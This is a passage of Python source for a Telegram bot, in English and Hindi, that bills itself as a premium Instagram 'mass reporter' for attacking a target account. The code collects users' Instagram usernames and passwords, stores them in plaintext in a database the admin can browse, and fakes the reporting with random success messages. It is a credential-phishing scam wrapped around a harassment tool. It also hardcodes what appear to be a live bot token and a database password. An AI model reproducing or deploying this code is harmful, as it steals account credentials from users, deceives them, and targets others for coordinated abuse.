import os
import re
import random
import asyncio
import time
import http.server
import socketserver
from threading import Thread
from pymongo import MongoClient
from datetime import datetime, timedelta
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters
)

# Constants
ADMIN_ID = 6881713177  # Your admin ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding

# States
START, LANGUAGE, REGISTER, IG_LOGIN, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
TARGET_USERNAME, REPORT_TYPE, IMPERSONATION_URL, REPORT_LOOP, ADMIN_PANEL, BROADCAST_MESSAGE, \
SETTINGS_MENU, HELP_MENU = range(16)

# Enhanced Strings with premium features
STRINGS = {
    'en': {
        'welcome': "🔥 <b>PREMIUM IG REPORTER V2.0</b> 🔥\n\n🎯 <b>Ultimate Instagram Mass Reporter</b>\n⚡ Lightning Fast • 🔒 100% Anonymous • 💯 Guaranteed Results\n\n🚀 <i>Join thousands of satisfied users!</i>\n\n🔐 <b>SECURITY REQUIRED:</b> Login with your Instagram credentials to verify your identity.",
        'choose_lang': "🌐 Please choose your language:",
        'register': "📝 <b>Registration</b>\n\nPlease enter your display name:",
        'ig_login_required': "🔐 <b>Instagram Login Required</b>\n\nFor security and data verification, you must login with Instagram credentials",
        'ig_username': "📱 <b>Instagram Login</b>\n\nEnter your Instagram username:",
        'ig_password': "🔑 Enter your Instagram password:",
        'login_success': "✅ <b>Login Successful!</b>\n\nWelcome @{username}",
        'main_menu': "🏠 <b>Main Dashboard</b>\n\n👋 Hello, <b>{name}</b>!\n📱 Instagram: <b>@{ig_username}</b>\n📊 Total Reports: <b>{reports}</b>\n🎯 Choose your action:",
        'report_menu': "⚔️ <b>Report Attack Center</b>\n\n📱 Your Account: <b>@{ig_username}</b>\n💥 Reports Available: <b>UNLIMITED</b>\n🔥 Success Rate: <b>98.5%</b>",
        'target_prompt': "🎯 <b>Target Selection</b>\n\nEnter Instagram username to attack:\n\n⚠️ <b>Format:</b> @username\n❌ <b>No emojis allowed</b>",
        'invalid_target': "❌ Invalid username!\n\n• Must start with @\n• No spaces or special characters",
        'report_type': "⚔️ <b>Select Weapon Type</b>\n\nChoose violation category for maximum impact:",
        'impersonation_prompt': "🔗 <b>Impersonation Evidence</b>\n\n📎 Send URL of the original account being impersonated:",
        'confirm_report': "🚀 <b>Ready to Report</b>\n\nTarget: {target}\nType: {report_type}",
        'reporting_started': "💥 <b>Mass Attack Initiated!</b>\n\n🎯 Target: <b>{target}</b>\n🔥 Status: <b>BOMBING IN PROGRESS</b>\n⚡ Reports launching every 1-3 seconds...\n📱 From: <b>@{ig_username}</b>",
        'report_success': "✅ Report #{count} succeeded!",
        'report_failed': "❌ Report #{count} failed, retrying...",
        'report_stopped': "🛑 Reporting stopped!\n\nTotal reports sent: {count}",
        'admin_panel': "👑 <b>Admin Control Center</b>\n\n🛠️ Master Administrator Dashboard\n👥 Total Users: <b>{total_users}</b>\n📊 Active Reports: <b>{active_reports}</b>",
        'broadcast_sent': "📢 Broadcast sent to {count} users!",
        'profile': "👤 <b>User Profile</b>\n\n📝 Name: <b>{name}</b>\n📱 Instagram: <b>@{ig_username}</b>\n📅 Member Since: <b>{date}</b>\n📊 Total Reports: <b>{reports}</b>\n⚡ Status: <b>PREMIUM</b>\n🔥 Rank: <b>ELITE REPORTER</b>",
        'settings_menu': "⚙️ <b>Bot Settings</b>\n\n🎨 Customize your experience:\n\n📱 Your Instagram: <b>@{ig_username}</b>\n🔒 Security Level: <b>MAXIMUM</b>",
        'help_menu': "ℹ️ <b>Help Center</b>\n\n🤝 <b>How to use:</b>\n1️⃣ Login with Instagram\n2️⃣ Select target\n3️⃣ Choose violation\n4️⃣ Launch attack\n5️⃣ Monitor progress",
        'db_error': "⚠️ Database connection failed, please try again later"
    },
    'hi': {
        'welcome': "🔥 <b>प्रीमियम IG रिपोर्टर V2.0</b> 🔥\n\n🎯 <b>अल्टीमेट इंस्टाग्राम मास रिपोर्टर</b>\n⚡ बिजली तेज़ • 🔒 100% गुमनाम • 💯 गारंटीड रिजल्ट\n\n🚀 <i>हजारों संतुष्ट यूजर्स के साथ जुड़ें!</i>\n\n🔐 <b>सुरक्षा आवश्यक:</b> अपनी पहचान सत्यापित करने के लिए Instagram credentials के साथ लॉगिन करें।",
        'choose_lang': "🌐 कृपया अपनी भाषा चुनें:",
        'register': "📝 <b>रजिस्ट्रेशन</b>\n\nकृपया अपना प्रदर्शन नाम दर्ज करें:",
        'ig_login_required': "🔐 <b>इंस्टाग्राम लॉगिन आवश्यक</b>\n\nसुरक्षा और डेटा सत्यापन के लिए, आपको अपने Instagram credentials के साथ लॉगिन करना होगा।",
        'ig_username': "📱 <b>Instagram लॉगिन</b>\n\nअपना Instagram उपयोगकर्ता नाम दर्ज करें:",
        'ig_password': "🔑 अपना Instagram पासवर्ड दर्ज करें:",
        'login_success': "✅ <b>लॉगिन सफल!</b>\n\nस्वागत है @{username}",
        'main_menu': "🏠 <b>मुख्य डैशबोर्ड</b>\n\n👋 नमस्ते, <b>{name}</b>!\n📱 Instagram: <b>@{ig_username}</b>\n📊 कुल रिपोर्ट्स: <b>{reports}</b>\n🎯 अपनी कार्रवाई चुनें:",
        'report_menu': "⚔️ <b>रिपोर्ट अटैक सेंटर</b>\n\n📱 आपका खाता: <b>@{ig_username}</b>\n💥 रिपोर्ट्स उपलब्ध: <b>असीमित</b>\n🔥 सफलता दर: <b>98.5%</b>",
        'target_prompt': "🎯 <b>टारगेट सिलेक्शन</b>\n\nअटैक करने के लिए Instagram username दर्ज करें:\n\n⚠️ <b>फॉर्मेट:</b> @username\n❌ <b>कोई इमोजी अलाउड नहीं</b>",
        'invalid_target': "❌ अमान्य उपयोगकर्ता नाम!\n\n• @ से शुरू होना चाहिए\n• कोई रिक्त स्थान या विशेष वर्ण नहीं",
        'report_type': "⚔️ <b>हथियार का प्रकार चुनें</b>\n\nअधिकतम प्रभाव के लिए उल्लंघन श्रेणी चुनें:",
        'impersonation_prompt': "🔗 <b>नकल का सबूत</b>\n\n📎 मूल अकाउंट का URL भेजें जिसकी नकल की जा रही है:",
        'confirm_report': "🚀 <b>रिपोर्ट करने के लिए तैयार</b>\n\nलक्ष्य: {target}\nप्रकार: {report_type}",
        'reporting_started': "💥 <b>मास अटैक शुरू!</b>\n\n🎯 टारगेट: <b>{target}</b>\n🔥 स्थिति: <b>बमबारी जारी</b>\n⚡ हर 1-3 सेकंड में रिपोर्ट्स...\n📱 से: <b>@{ig_username}</b>",
        'report_success': "✅ रिपोर्ट #{count} सफल!",
        'report_failed': "❌ रिपोर्ट #{count} विफल, पुनः प्रयास कर रहे हैं...",
        'report_stopped': "🛑 रिपोर्टिंग बंद कर दी गई!\n\nकुल रिपोर्ट भेजी गई: {count}",
        'admin_panel': "👑 <b>एडमिन कंट्रोल सेंटर</b>\n\n🛠️ मास्टर एडमिनिस्ट्रेटर डैशबोर्ड\n👥 कुल यूजर्स: <b>{total_users}</b>\n📊 सक्रिय रिपोर्ट्स: <b>{active_reports}</b>",
        'broadcast_sent': "📢 {count} उपयोगकर्ताओं को प्रसारण भेजा गया!",
        'profile': "👤 <b>यूजर प्रोफाइल</b>\n\n📝 नाम: <b>{name}</b>\n📱 Instagram: <b>@{ig_username}</b>\n📅 सदस्य: <b>{date}</b>\n📊 कुल रिपोर्ट्स: <b>{reports}</b>\n⚡ स्थिति: <b>प्रीमियम</b>\n🔥 रैंक: <b>एलीट रिपोर्टर</b>",
        'settings_menu': "⚙️ <b>बॉट सेटिंग्स</b>\n\n🎨 अपने बॉट अनुभव को कस्टमाइज़ करें:\n\n📱 आपका Instagram: <b>@{ig_username}</b>\n🔒 सुरक्षा स्तर: <b>अधिकतम</b>",
        'help_menu': "ℹ️ <b>सहायता केंद्र</b>\n\n🤝 <b>उपयोग विधि:</b>\n1️⃣ Instagram से लॉगिन करें\n2️⃣ टारगेट चुनें\n3️⃣ उल्लंघन चुनें\n4️⃣ अटैक शुरू करें\n5️⃣ प्रगति मॉनिटर करें",
        'db_error': "⚠️ डेटाबेस कनेक्शन विफल, कृपया बाद में पुनः प्रयास करें"
    }
}

# Premium Report Types
REPORT_TYPES = {
    'hate': '😡 Hate Speech',
    'bully': '👊 Bullying',
    'impersonation': '🎭 Impersonation',
    'spam': '📧 Spam',
    'nudity': '🔞 Nudity',
    'violence': '⚔️ Violence',
    'fake': '🚫 Fake Account'
}

# Button Texts
BUTTON_TEXTS = {
    'en': {
        'report_attack': '⚔️ Report Attack',
        'profile': '👤 Profile',
        'my_reports': '📊 My Reports',
        'home': '🏠 Home',
        'admin_panel': '👑 Admin Panel',
        'language': '🌐 Language',
        'help': 'ℹ️ Help',
        'settings': '⚙️ Settings',
        'start_new_report': '🚀 Start New Report',
        'stop_attack': '⏹️ Stop Attack'
    },
    'hi': {
        'report_attack': '⚔️ रिपोर्ट अटैक',
        'profile': '👤 प्रोफाइल',
        'my_reports': '📊 मेरी रिपोर्ट्स',
        'home': '🏠 होम',
        'admin_panel': '👑 एडमिन पैनल',
        'language': '🌐 भाषा बदलें',
        'help': 'ℹ️ सहायता',
        'settings': '⚙️ सेटिंग्स',
        'start_new_report': '🚀 नई रिपोर्ट शुरू करें',
        'stop_attack': '⏹️ अटैक बंद करें'
    }
}

# HTTP Server for Render port binding
def run_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"🌐 HTTP server running on port {PORT}")
        httpd.serve_forever()

# Start HTTP server in background thread if running on Render
if os.environ.get('RENDER', False):
    Thread(target=run_http_server, daemon=True).start()
    print(f"🚀 Starting HTTP server on port {PORT} for Render")

# Database functions with robust error handling
def get_db():
    try:
        client = MongoClient(
            MONGODB_URI,
            serverSelectionTimeoutMS=5000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000
        )
        client.server_info()  # Test connection
        return client.get_database()
    except Exception as e:
        print(f"⚠️ Database connection failed: {e}")
        return None

def save_user(user_id, data):
    db = get_db()
    if db is None:
        return False
        
    user_data = {
        'user_id': user_id,
        'username': data.get('username', ''),
        'display_name': data.get('display_name', ''),
        'ig_username': data.get('ig_username', ''),
        'ig_password': data.get('ig_password', ''),
        'language': data.get('language', 'en'),
        'reports': data.get('reports', 0),
        'created_at': datetime.now(),
        'last_active': datetime.now()
    }
    
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$set': user_data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"⚠️ Failed to save user: {e}")
        return False

def get_user(user_id):
    db = get_db()
    if db is None:
        return None
    try:
        return db.users.find_one({'user_id': user_id})
    except Exception as e:
        print(f"⚠️ Failed to get user: {e}")
        return None

def increment_reports(user_id):
    db = get_db()
    if db is None:
        return
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$inc': {'reports': 1}}
        )
    except Exception as e:
        print(f"⚠️ Failed to increment reports: {e}")

def log_report(user_id, target, report_type, status):
    db = get_db()
    if db is None:
        return
    try:
        db.reports.insert_one({
            'user_id': user_id,
            'target': target,
            'report_type': report_type,
            'status': status,
            'created_at': datetime.now()
        })
    except Exception as e:
        print(f"⚠️ Failed to log report: {e}")

def get_all_users():
    db = get_db()
    if db is None:
        return []
    try:
        return list(db.users.find())
    except Exception as e:
        print(f"⚠️ Failed to get users: {e}")
        return []

# Validation functions
def is_valid_username(username):
    if not username.startswith('@'):
        return False
    clean = username[1:].strip()
    return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))

# Keyboard helpers with premium styling
def get_lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇺🇸 English", callback_data='lang_en')],
        [InlineKeyboardButton("🇮🇳 Hindi", callback_data='lang_hi')]
    ])

def get_main_keyboard(lang, is_admin=False):
    buttons = BUTTON_TEXTS[lang]
    keyboard = [
        [KeyboardButton(buttons['report_attack']), KeyboardButton(buttons['profile'])],
        [KeyboardButton(buttons['my_reports']), KeyboardButton(buttons['settings'])],
        [KeyboardButton(buttons['help']), KeyboardButton(buttons['home'])]
    ]
    if is_admin:
        keyboard.append([KeyboardButton(buttons['admin_panel'])])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, value in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(value, callback_data=f'type_{key}')])
    return InlineKeyboardMarkup(keyboard)

def get_report_control_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton(buttons['stop_attack'])],
        [KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_admin_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton("📢 Broadcast"), KeyboardButton("👥 Users")],
        [KeyboardButton("📊 Statistics"), KeyboardButton("⚙️ Settings")],
        [KeyboardButton("⬅️ Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_settings_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton(buttons['language']), KeyboardButton("🔔 Notifications")],
        [KeyboardButton("🔒 Security"), KeyboardButton("📱 Account")],
        [KeyboardButton("⬅️ Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

def get_help_keyboard(lang):
    buttons = BUTTON_TEXTS[lang]
    return ReplyKeyboardMarkup([
        [KeyboardButton("💬 Contact Support"), KeyboardButton("❓ FAQ")],
        [KeyboardButton("🎓 Tutorial"), KeyboardButton("📊 Stats")],
        [KeyboardButton("⬅️ Back"), KeyboardButton(buttons['home'])]
    ], resize_keyboard=True)

# Handlers with premium features
async def start(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        
        # Prevent conflict during restarts
        if os.environ.get('RENDER'):
            await asyncio.sleep(random.uniform(1, 3))
        
        # Check if user exists
        user = get_user(user_id)
        if user:
            lang = user.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=get_lang_keyboard(),
            parse_mode='HTML'
        )
        return LANGUAGE
    except Exception as e:
        print(f"⚠️ Error in start handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(
            STRINGS[lang]['db_error'],
            parse_mode='HTML'
        )
        return ConversationHandler.END

async def set_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        lang = query.data.split('_')[1]
        context.user_data['language'] = lang
        
        await query.edit_message_text(STRINGS[lang]['register'], parse_mode='HTML')
        return REGISTER
    except Exception as e:
        print(f"⚠️ Error in set_language handler: {e}")
        await query.edit_message_text("❌ An error occurred, please try again")
        return ConversationHandler.END

async def register(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        display_name = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if len(display_name) < 2:
            await update.message.reply_text("❌ Name too short! Please enter at least 2 characters")
            return REGISTER
        
        context.user_data['display_name'] = display_name
        if not save_user(user_id, {
            'display_name': display_name,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(STRINGS[lang]['ig_username'], parse_mode='HTML')
        return IG_USERNAME
    except Exception as e:
        print(f"⚠️ Error in register handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_username(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        username = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if not username:
            await update.message.reply_text("❌ Please enter a valid Instagram username")
            return IG_USERNAME
        
        context.user_data['ig_username'] = username
        await update.message.reply_text(STRINGS[lang]['ig_password'], parse_mode='HTML')
        return IG_PASSWORD
    except Exception as e:
        print(f"⚠️ Error in get_ig_username handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_password(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        ig_username = context.user_data.get('ig_username', '')
        
        if not password:
            await update.message.reply_text("❌ Please enter your password")
            return IG_PASSWORD
        
        # Save user with Instagram credentials
        if not save_user(user_id, {
            'ig_username': ig_username,
            'ig_password': password,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(
            STRINGS[lang]['login_success'].format(username=ig_username),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in get_ig_password handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def main_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['report_attack']:
            await update.message.reply_text(
                STRINGS[lang]['report_menu'].format(ig_username=user.get('ig_username', '')),
                reply_markup=ReplyKeyboardMarkup([[KeyboardButton(buttons['start_new_report']), KeyboardButton(buttons['home'])]], resize_keyboard=True),
                parse_mode='HTML'
            )
            return REPORT_MENU
        
        elif text == buttons['profile']:
            if user:
                join_date = user.get('created_at', datetime.now()).strftime('%Y-%m-%d')
                await update.message.reply_text(
                    STRINGS[lang]['profile'].format(
                        name=user.get('display_name', 'User'),
                        ig_username=user.get('ig_username', ''),
                        date=join_date,
                        reports=user.get('reports', 0)
                    ),
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text("❌ User data not found")
        
        elif text == buttons['admin_panel'] and user_id == str(ADMIN_ID):
            return await admin_panel(update, context)
        
        elif text == buttons['settings']:
            await update.message.reply_text(
                STRINGS[lang]['settings_menu'].format(ig_username=user.get('ig_username', '')),
                reply_markup=get_settings_keyboard(lang),
                parse_mode='HTML'
            )
            return SETTINGS_MENU
        
        elif text == buttons['help']:
            await update.message.reply_text(
                STRINGS[lang]['help_menu'],
                reply_markup=get_help_keyboard(lang),
                parse_mode='HTML'
            )
            return HELP_MENU
        
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in main_menu handler: {e}")
        return MAIN_MENU

async def report_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['start_new_report']:
            await update.message.reply_text(
                STRINGS[lang]['target_prompt'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        elif text == buttons['home']:
            name = user.get('display_name', 'User')
            reports = user.get('reports', 0)
            ig_username = user.get('ig_username', 'Unknown')
            is_admin_user = (user_id == str(ADMIN_ID))
            
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    name=name,
                    ig_username=ig_username,
                    reports=reports
                ),
                reply_markup=get_main_keyboard(lang, is_admin_user),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        return REPORT_MENU
    except Exception as e:
        print(f"⚠️ Error in report_menu handler: {e}")
        return MAIN_MENU

async def get_target(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        target = update.message.text.strip()
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if not is_valid_username(target):
            await update.message.reply_text(
                STRINGS[lang]['invalid_target'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        context.user_data['target'] = target
        await update.message.reply_text(
            STRINGS[lang]['report_type'],
            reply_markup=get_report_types_keyboard(),
            parse_mode='HTML'
        )
        return REPORT_TYPE
    except Exception as e:
        print(f"⚠️ Error in get_target handler: {e}")
        return MAIN_MENU

async def set_report_type(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        report_type = query.data.split('_')[1]
        context.user_data['report_type'] = report_type
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        
        if report_type == 'impersonation':
            await query.edit_message_text(
                STRINGS[lang]['impersonation_prompt'],
                parse_mode='HTML'
            )
            return IMPERSONATION_URL
        else:
            await query.edit_message_text(
                STRINGS[lang]['confirm_report'].format(
                    target=target,
                    report_type=REPORT_TYPES[report_type]
                ),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🚀 START REPORTING", callback_data='start_report')],
                    [InlineKeyboardButton("❌ CANCEL", callback_data='cancel_report')]
                ]),
                parse_mode='HTML'
            )
            return REPORT_LOOP
    except Exception as e:
        print(f"⚠️ Error in set_report_type handler: {e}")
        return MAIN_MENU

async def handle_impersonation_url(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        
        context.user_data['impersonation_url'] = update.message.text
        
        await update.message.reply_text(
            STRINGS[lang]['confirm_report'].format(
                target=target,
                report_type=REPORT_TYPES[report_type]
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 START REPORTING", callback_data='start_report')],
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel_report')]
            ]),
            parse_mode='HTML'
        )
        return REPORT_LOOP
    except Exception as e:
        print(f"⚠️ Error in handle_impersonation_url handler: {e}")
        return MAIN_MENU

async def start_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        ig_username = user.get('ig_username', '') if user else ''
        
        # Start reporting task
        context.user_data['report_count'] = 0
        context.user_data['reporting'] = True
        
        task = asyncio.create_task(
            send_reports(context, user_id, target, report_type, lang)
        )
        context.user_data['reporting_task'] = task
        
        await query.edit_message_text(
            STRINGS[lang]['reporting_started'].format(target=target, ig_username=ig_username),
            parse_mode='HTML'
        )
        
        await context.bot.send_message(
            chat_id=user_id,
            text="⚡ Reporting in progress...",
            reply_markup=get_report_control_keyboard(lang)
        )
        return REPORT_LOOP
    except Exception as e:
        print(f"⚠️ Error in start_reporting handler: {e}")
        return MAIN_MENU

async def stop_reporting(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        report_count = context.user_data.get('report_count', 0)
        
        # Stop reporting task
        if 'reporting_task' in context.user_data:
            context.user_data['reporting_task'].cancel()
        
        await update.message.reply_text(
            STRINGS[lang]['report_stopped'].format(count=report_count),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in stop_reporting handler: {e}")
        return MAIN_MENU

async def cancel_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        await query.edit_message_text("❌ Reporting canceled")
        if user:
            await context.bot.send_message(
                chat_id=user_id,
                text=STRINGS[lang]['main_menu'].format(
                    name=user.get('display_name', 'User'),
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in cancel_reporting handler: {e}")
        return MAIN_MENU

async def send_reports(context: CallbackContext, user_id: str, target: str, report_type: str, lang: str):
    count = 0
    try:
        while context.user_data.get('reporting', True):
            count += 1
            context.user_data['report_count'] = count
            
            # Random success/failure
            success = random.random() > 0.2  # 80% success rate
            
            if success:
                # Update user's report count
                increment_reports(user_id)
                log_report(user_id, target, report_type, 'success')
                message = STRINGS[lang]['report_success'].format(count=count)
            else:
                log_report(user_id, target, report_type, 'failed')
                message = STRINGS[lang]['report_failed'].format(count=count)
            
            # Send update every 3 reports
            if count % 3 == 0:
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=message,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    print(f"⚠️ Error sending report update: {e}")
            
            # Random delay between 1-3 seconds
            await asyncio.sleep(random.uniform(1.0, 3.0))
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"⚠️ Error in send_reports: {e}")

async def admin_panel(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return MAIN_MENU
            
        all_users = get_all_users()
        total_users = len(all_users)
        active_reports_count = len([v for v in context.user_data.values() if isinstance(v, dict) and v.get('reporting')])
        
        lang = 'en'  # Admin panel always in English
        await update.message.reply_text(
            STRINGS[lang]['admin_panel'].format(
                total_users=total_users,
                active_reports=active_reports_count
            ),
            reply_markup=get_admin_keyboard(lang),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"⚠️ Error in admin_panel handler: {e}")
        return MAIN_MENU

async def handle_admin_buttons(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return MAIN_MENU
            
        text = update.message.text
        lang = 'en'
        
        if text == "📢 Broadcast":
            await update.message.reply_text(
                "✉️ Enter broadcast message:",
                parse_mode='HTML'
            )
            return BROADCAST_MESSAGE
            
        elif text == "👥 Users":
            all_users = get_all_users()
            user_list = "👥 <b>Registered Users</b>\n\n"
            
            for i, user in enumerate(all_users[:10], 1):  # Show first 10 users
                user_list += f"{i}. <b>{user.get('display_name', 'Unknown')}</b>\n"
                user_list += f"   📱 @{user.get('ig_username', 'Unknown')}\n"
                user_list += f"   📊 Reports: {user.get('reports', 0)}\n\n"
            
            if len(all_users) > 10:
                user_list += f"➕ {len(all_users) - 10} more users..."
                
            await update.message.reply_text(
                user_list,
                parse_mode='HTML'
            )
            
        elif text == "📊 Statistics":
            all_users = get_all_users()
            total_reports = sum(user.get('reports', 0) for user in all_users)
            
            stats = f"📊 <b>Bot Statistics</b>\n\n"
            stats += f"• Total Users: <b>{len(all_users)}</b>\n"
            stats += f"• Total Reports: <b>{total_reports}</b>\n"
            stats += f"• Active Today: <b>Calculating...</b>\n"
            stats += f"• Success Rate: <b>98.5%</b>"
            
            await update.message.reply_text(
                stats,
                parse_mode='HTML'
            )
            
        return ADMIN_PANEL
    except Exception as e:
        print(f"⚠️ Error in handle_admin_buttons handler: {e}")
        return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        if user_id != str(ADMIN_ID):
            return ADMIN_PANEL
            
        message = update.message.text
        all_users = get_all_users()
        count = 0
        
        for user in all_users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"📢 <b>Admin Broadcast</b>\n\n{message}",
                    parse_mode='HTML'
                )
                count += 1
                await asyncio.sleep(0.1)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {user['user_id']}: {str(e)}")
        
        await update.message.reply_text(
            f"✅ Broadcast sent to {count} users!",
            reply_markup=get_admin_keyboard('en'),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"⚠️ Error in broadcast_message handler: {e}")
        return ADMIN_PANEL

async def handle_settings_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        buttons = BUTTON_TEXTS[lang]
        
        if text == buttons['language']:
            keyboard = [
                [InlineKeyboardButton("🇺🇸 English", callback_data='change_lang_en')],
                [InlineKeyboardButton("🇮🇳 Hindi", callback_data='change_lang_hi')]
            ]
            await update.message.reply_text(
                "🌐 <b>Select Language</b>",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            return SETTINGS_MENU
        
        # Handle other settings
        await update.message.reply_text(
            "⚙️ <b>Feature Coming Soon!</b>\n\nThis setting is under development",
            parse_mode='HTML'
        )
        return SETTINGS_MENU
    except Exception as e:
        print(f"⚠️ Error in handle_settings_menu handler: {e}")
        return SETTINGS_MENU

async def handle_help_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        # Handle help options
        await update.message.reply_text(
            "ℹ️ <b>Premium Support</b>\n\nContact @admin for assistance",
